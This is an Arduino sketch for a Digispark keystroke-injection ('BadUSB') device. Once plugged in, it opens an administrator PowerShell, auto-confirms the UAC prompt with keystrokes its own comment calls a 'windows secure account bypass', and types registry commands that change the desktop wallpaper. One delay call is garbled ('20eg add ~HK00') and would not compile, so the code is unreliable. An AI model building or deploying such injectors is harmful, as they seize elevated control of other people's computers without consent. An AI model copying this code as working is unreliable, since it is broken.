#include <DigiKeyboard.h>

void setup() {

  // put your setup code here, to run once:
  extern void openPowerShell();
  extern void setWallpaper();
  
  openPowerShell();
  setWallpaper();
}

void openPowerShell(){
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);

  //open admin powershell
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.delay(4000);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(4000);

  //windows secure account bypass
  DigiKeyboard.sendKeyStroke(KEY_Y, KEY_LEFT_ALT);
  DigiKeyboard.delay(4000);


}

void setWallpaper(){
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);

  //DigiKeyboard.print(F(""));
  DigiKeyboard.write("reg add 'HKCU\\control panel\\desktop' /v wallpaper /t REG_SZ /d C:\\Users\\acaua\\Desktop\\maybe.png /f");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(20eg add ~HK00);

  DigiKeyboard.print(F("reg add 'HKCU\\control panel\\desktop' /v WallpaperStyle /t REG_SZ /d 2 /f"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);  
  DigiKeyboard.delay(2000);

  DigiKeyboard.print("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
}

void loop() {
  // put your main code here, to run repeatedly:
}